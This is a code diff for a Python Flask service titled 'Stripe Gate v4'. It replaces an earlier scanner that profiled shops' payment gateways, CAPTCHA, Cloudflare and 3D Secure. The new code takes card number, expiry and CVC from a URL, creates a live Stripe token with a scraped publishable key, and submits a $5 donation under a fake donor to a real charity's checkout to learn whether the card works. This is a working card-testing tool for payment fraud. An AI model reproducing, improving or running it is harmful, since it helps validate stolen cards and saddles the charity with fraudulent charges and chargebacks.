@@ -1,267 +1,244 @@
+import requests
+import json
 import re
-import aiohttp
-import asyncio
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse
+from urllib.parse import unquote
 from flask import Flask, request, jsonify
-import nest_asyncio
-import logging
 
-# Apply nest_asyncio to allow nested event loops (important for some environments)
-nest_asyncio.apply()
-
-# Initialize Flask app
 app = Flask(__name__)
+session = requests.Session()
 
-# Set up logging to see errors in your server logs
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# ===============================================
+# 1. CLEAN RESPONSE PARSER
+# ===============================================
+def log_final_response(response):
+    try:
+        try:
+            data = response.json()
+            if 'error' in data:
+                code = data['error'].get('code', '')
+                msg  = data['error'].get('message', '')
+            else:
+                code = ''
+                msg  = data
+        except json.JSONDecodeError:
+            html = response.text
+            html = re.sub(r'[\r\n]+Param\s*is:.*?(?=[\r\n]|<)', '', html, flags=re.I)
+            code_match = re.search(r'Code\s*is:\s*([^<\n]+)', html, re.I)
+            msg_match  = re.search(r'Message\s*is:\s*([^<\n]+)', html, re.I)
+            code = code_match.group(1).strip() if code_match else ''
+            msg  = msg_match.group(1).strip() if msg_match else 'Unknown error'
 
-# CMS patterns
-CMS_PATTERNS = {
-    'Shopify': r'cdn\.shopify\.com|shopify\.js',
-    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
-    'Wix': r'static\.parastorage\.com|wix\.com',
-    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
-    'WooCommerce': r'wp-content/plugins/woocommerce/',
-    'Magento': r'static/version\d+/frontend/|magento/',
-    'PrestaShop': r'prestashop\.js|prestashop/',
-    'OpenCart': r'catalog/view/theme|opencart/',
-    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
-    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
-    'WordPress': r'wp-content|wp-includes/',
-    'Joomla': r'media/jui|joomla\.js|media/system/js|joomla\.javascript/',
-    'Drupal': r'sites/all/modules|drupal\.js/|sites/default/files|drupal\.settings\.js/',
-    'TYPO3': r'typo3temp|typo3/',
-    'Concrete5': r'concrete/js|concrete5/',
-    'Umbraco': r'umbraco/|umbraco\.config/',
-    'Sitecore': r'sitecore/content|sitecore\.js/',
-    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
-    'Episerver': r'episerver/|episerver\.js/',
-    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
-}
+        result = {
+            "error_code": code,
+            "response": {
+                "code": code,
+                "message": msg
+            }
+        }
+    except Exception as e:
+        result = {
+            "error_code": "parse_error",
+            "response": {
+                "code": "parse_error",
+                "message": f"Parse failed: {str(e)}"
+            }
+        }
+    print(json.dumps(result, indent=2))
+    return result
 
-# Payment gateways list
-PAYMENT_GATEWAYS = [
-    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
-    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
-    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
-    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
-    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
-    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
-    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
-    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
-    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
-    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
-    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
-    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
-    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
-    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
-    "paycomet", "geomerchant", "realexpayments", "Razorpay",
-    "Apple Pay", "Google Pay", "Samsung Pay", "Cash App",
-    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
-    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
-    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
-    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",
-    "Paytm", "UPI", "PayU", "PayUBiz", "PayUMoney", "CCAvenue",
-    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
-    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
-    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
-    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
-    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
-    "Citrus Pay", "RazorpayX", "Cashfree",
-    "Klarna", "Affirm", "Afterpay",
-    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
-    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
-    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
-    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
-    "Binance Pay", "CoinsPaid", "BitGo", "Flexa",
-    "ACI Worldwide", "Bank of America Merchant Services",
-    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
-    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
-    "Discover Network", "UnionPay", "JCB Payment Gateway",
-]
 
-# --- Fetch site ---
-async def fetch_site(session: aiohttp.ClientSession, url: str):
-    # Clean up the URL
-    url = url.strip()
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + url
-    
-    # Remove trailing slash if present
-    if url.endswith("/"):
-        url = url[:-1]
-    
-    logger.info(f"Fetching site: {url}")
+# ===============================================
+# 2. GET CSRF TOKEN
+# ===============================================
+def get_csrf_token():
+    headers = {
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
+        'referer': 'https://www.mannahelps.org/donate/food/',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    }
+    try:
+        r = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
+        m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
+        return m.group(1) if m else None
+    except:
+        return None
+
+
+# ===============================================
+# 3. CREATE STRIPE TOKEN
+# ===============================================
+def create_stripe_token(cc, mm, yy, cvc):
+    if len(yy) == 2:
+        yy = '20' + yy
 
     headers = {
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "accept-language": "en-US,en;q=0.9",
-        "cache-control": "max-age=0",
-        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
-        "sec-ch-ua-mobile": "?1",
-        "sec-ch-ua-platform": '"Android"',
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "none",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
-                      "AppleWebKit/537.36 (KHTML, like Gecko) "
-                      "Chrome/140.0.0.0 Mobile Safari/537.36",
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
     }
 
+    payload = (
+        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
+        f'&payment_user_agent=stripe.js%2F78ef418'
+        f'&card[number]={cc}'
+        f'&card[exp_month]={mm}'
+        f'&card[exp_year]={yy}'
+        f'&card[cvc]={cvc}'
+        f'&card[name]=Test+User'
+        f'&card[address_line1]=123+Main+St'
+        f'&card[address_city]=Miami'
+        f'&card[address_state]=FL'
+        f'&card[address_zip]=33101'
+    )
+
     try:
-        async with session.get(url, headers=headers, timeout=15) as resp:
-            text = await resp.text()
-            logger.info(f"Successfully fetched {url} with status {resp.status}")
-            return resp.status, text, resp.headers
-    except aiohttp.ClientError as e:
-        logger.error(f"Client error when fetching {url}: {str(e)}")
-        return None, None, {"error": f"Client error: {str(e)}"}
-    except asyncio.TimeoutError:
-        logger.error(f"Timeout when fetching {url}")
-        return None, None, {"error": "Request timeout"}
+        r = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload, timeout=20)
+        j = r.json()
+        return j.get('id'), None
     except Exception as e:
-        logger.error(f"Unexpected error when fetching {url}: {str(e)}")
-        return None, None, {"error": f"Unexpected error: {str(e)}"}
+        return None, f"Stripe error: {str(e)}"
 
-# --- Detection functions ---
-def detect_cms(html: str):
-    for cms, pattern in CMS_PATTERNS.items():
-        match = re.search(pattern, html, re.IGNORECASE)
-        if match:
-            if cms == 'Custom CMS':
-                return match.group(1) or "Custom CMS"
-            return cms
-    return "Unknown"
 
-def detect_security(html: str):
-    patterns_3ds = [
-        r'3d\s*secure', r'verified\s*by\s*visa', r'mastercard\s*securecode',
-        r'american\s*express\s*safekey', r'3ds', r'3ds2', r'acsurl',
-        r'pareq', r'three-domain-secure', r'secure_redirect',
+# ===============================================
+# 4. SUBMIT $5 DONATION
+# ===============================================
+def submit_donation(stripe_token):
+    csrf = get_csrf_token()
+    if not csrf:
+        return {"error_code": "csrf_failed", "response": {"code": "csrf_failed", "message": "CSRF token missing"}}
+
+    headers = {
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.mannahelps.org',
+        'referer': 'https://www.mannahelps.org/donate/money/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    }
+
+    data = [
+        ('account', 'Programs/Services'),
+        ('amount', 'other'),
+        ('amnto-text', '5'),           # ← $5
+        ('name', 'Test User'),
+        ('email', 'test@example.com'),
+        ('comfirmAddress', 'test@example.com'),
+        ('phone', '5551234567'),
+        ('address_line1', '123 Main St'),
+        ('address_city', 'Miami'),
+        ('address_state', 'FL'),
+        ('address_zip', '33101'),
+        ('formID', 'donate'),
+        ('csrf_token', csrf),
+        ('id', 'Manna Donation'),
+        ('itemInfo', 'One-Time Donation'),
+        ('interval', '1'),
+        ('amountInput', '5.00'),       # ← $5.00
+        ('id', 'Payment'),
+        ('utm_source', 'null'),
+        ('utm_medium', 'null'),
+        ('utm_campaign', 'null'),
+        ('gclid', 'null'),
+        ('stripeToken', stripe_token),
     ]
-    for pattern in patterns_3ds:
-        if re.search(pattern, html, re.IGNORECASE):
-            return "3D Secure Detected"
-    return "2D (No 3D Secure Found)"
 
-def detect_gateways(html: str):
-    detected = []
-    for gateway in PAYMENT_GATEWAYS:
-        pattern = r'\b' + re.escape(gateway) + r'\b'
-        if re.search(pattern, html, re.IGNORECASE):
-            detected.append(gateway)
-    return detected if detected else []
-
-def detect_captcha(html: str):
-    html_lower = html.lower()
-    if "hcaptcha" in html_lower:
-        return "hCaptcha Detected"
-    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
-        return "reCAPTCHA Detected"
-    elif "captcha" in html_lower:
-        return "Generic Captcha Detected"
-    return "No Captcha Detected"
-
-def detect_cloudflare(html: str, headers=None, status=None):
-    if headers is None:
-        headers = {}
-    lower_keys = [k.lower() for k in headers.keys()]
-    server = headers.get('Server', '').lower()
-    cloudflare_indicators = [r'cloudflare', r'cf-ray', r'cf-cache-status', r'cf-browser-verification', r'__cfduid', r'cf_chl_', r'checking your browser', r'enable javascript and cookies', r'ray id', r'ddos protection by cloudflare']
-    
-    if 'cf-ray' in lower_keys or 'cloudflare' in server or 'cf-cache-status' in lower_keys:
-        soup = BeautifulSoup(html, 'html.parser')
-        title = soup.title.string.strip().lower() if soup.title else ''
-        challenge_indicators = ["just a moment", "attention required", "checking your browser", "enable javascript and cookies to continue", "ddos protection by cloudflare", "please wait while we verify"]
-        
-        if any(indicator in title for indicator in challenge_indicators):
-            return "Cloudflare Verification Detected"
-        if any(re.search(pattern, html, re.IGNORECASE) for pattern in cloudflare_indicators):
-            return "Cloudflare Verification Detected"
-        if status in (403, 503) and 'cloudflare' in html.lower():
-            return "Cloudflare Verification Detected"
-        return "Cloudflare Present (No Verification)"
-    return "None"
-
-def detect_graphql(html: str):
-    if re.search(r'/graphql|graphqlendpoint|apollo-client|query\s*\{|mutation\s*\{', html, re.IGNORECASE):
-        return "GraphQL Detected"
-    return "No GraphQL Detected"
-
-# --- Main scanning worker ---
-async def scan_site(url: str):
-    # Create a new session for this specific request to avoid event loop issues
-    # The 'async with' block ensures the session is properly closed
-    connector = aiohttp.TCPConnector(ssl=False, limit=100, limit_per_host=10)
-    timeout = aiohttp.ClientTimeout(total=30, connect=10)
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        status, html, headers = await fetch_site(session, url)
-        
-        if not html:
-            error_msg = "Unknown error"
-            if headers and "error" in headers:
-                error_msg = headers["error"]
-            return {"success": False, "error": f"Cannot access {url}. {error_msg}"}
-
-        cms = detect_cms(html)
-        security = detect_security(html)
-        gateways = detect_gateways(html)
-        captcha = detect_captcha(html)
-        cloudflare = detect_cloudflare(html, headers=headers, status=status)
-        graphql = detect_graphql(html)
-
-        return {
-            "success": True,
-            "url": url,
-            "cms": cms,
-            "gateways": gateways,
-            "captcha": captcha,
-            "cloudflare": cloudflare,
-            "security": security,
-            "graphql": graphql
-        }
-
-# --- API endpoint ---
-@app.route('/gateway', methods=['GET'])
-def gateway():
-    url = request.args.get('url')
-    
-    if not url:
-        return jsonify({
-            "success": False,
-            "error": "URL parameter is required"
-        }), 400
-    
-    # Run the async function in a new event loop for this request
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
     try:
-        result = loop.run_until_complete(scan_site(url))
-        return jsonify(result)
-    finally:
-        # Always close the loop to free up resources
-        loop.close()
+        r = session.post('https://www.mannahelps.org/checkout/payment.php', headers=headers, data=data, timeout=30)
+        return log_final_response(r)
+    except Exception as e:
+        return {"error_code": "submit_error", "response": {"code": "submit_error", "message": str(e)}}
 
-# --- Health check endpoint ---
-@app.route('/health', methods=['GET'])
-def health():
-    return jsonify({"status": "healthy"})
 
-# --- Welcome endpoint ---
-@app.route('/', methods=['GET'])
-def welcome():
-    return jsonify({
-        "message": "Welcome to Nexus Gateway Checker API",
-        "usage": "Use /gateway?url={site_url} to check a website",
-        "example": "nexus.cxchk.site/gateway?url=example.com"
-    })
+# ===============================================
+# 5. MAIN ENDPOINT – $5, NO CC VALIDATION
+# ===============================================
+@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
+def stripe_gate(card):
+    try:
+        decoded = unquote(card)
+        parts = [p.strip() for p in decoded.split('|')]
+        if len(parts) != 4:
+            return jsonify({
+                "error_code": "invalid_format",
+                "response": {"code": "invalid_format", "message": "Use: cc|mm|yy|cvc"}
+            }), 400
 
-# --- Main function ---
+        cc, mm, yy, cvc = parts
+
+        # Validate only MM, YY, CVC
+        if not mm.isdigit() or not (1 <= int(mm) <= 12):
+            return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
+        if not yy.isdigit() or len(yy) not in [2, 4]:
+            return jsonify({"error_code": "invalid_yy", "response": {"code": "invalid_yy", "message": "Invalid year"}}), 400
+        if not cvc.isdigit():
+            return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "CVC must be digits"}}), 400
+
+        # Amex CVC Rule
+        is_amex = cc.startswith('3')
+        cvc_len = len(cvc)
+
+        if is_amex:
+            if cvc_len != 4:
+                return jsonify({
+                    "error_code": "incorrect_cvc",
+                    "response": {
+                        "code": "incorrect_cvc",
+                        "message": "Your card's security code is invalid"
+                    }
+                }), 400
+        else:
+            if cvc_len != 3:
+                return jsonify({
+                    "error_code": "incorrect_cvc",
+                    "response": {
+                        "code": "incorrect_cvc",
+                        "message": "Your card's security code is invalid"
+                    }
+                }), 400
+
+        # Create token
+        token, err = create_stripe_token(cc, mm, yy, cvc)
+        if not token:
+            return jsonify({
+                "error_code": "token_failed",
+                "response": {"code": "token_failed", "message": err or "Token creation failed"}
+            }), 400
+
+        # Submit $5 donation
+        return jsonify(submit_donation(token)), 200
+
+    except Exception as e:
+        return jsonify({
+            "error_code": "server_error",
+            "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
+        }), 500
+
+
+# ===============================================
+# 6. HOME PAGE
+# ===============================================
+@app.route('/')
+def home():
+    return """
+    <h2>Stripe Gate v4 – MannaHelps.org ($5)</h2>
+    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=4111111111111111|12|25|123</code></p>
+    <p><b>Format:</b> <code>cc|mm|yy|cvc</code></p>
+    <p><b>CVC Rules:</b></p>
+    <ul>
+      <li>Amex (3xxx) → 4-digit CVC</li>
+      <li>All others → 3-digit CVC</li>
+    </ul>
+    <p><b>Amount:</b> <strong>$5.00</strong> per charge</p>
+    <p><b>No card number validation</b></p>
+    """
+
+
+# ===============================================
+# 7. RUN SERVER
+# ===============================================
 if __name__ == '__main__':
-    # Use 0.0.0.0 to make it accessible from outside the container
-    app.run(host='0.0.0.0', port=5000)
+    print("Stripe Gate v4 ($5) Running")
+    print("→ http://127.0.0.1:5000")
+    print("Test: /gate=stripe1$/cc=4242424242424242|12|25|123")
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
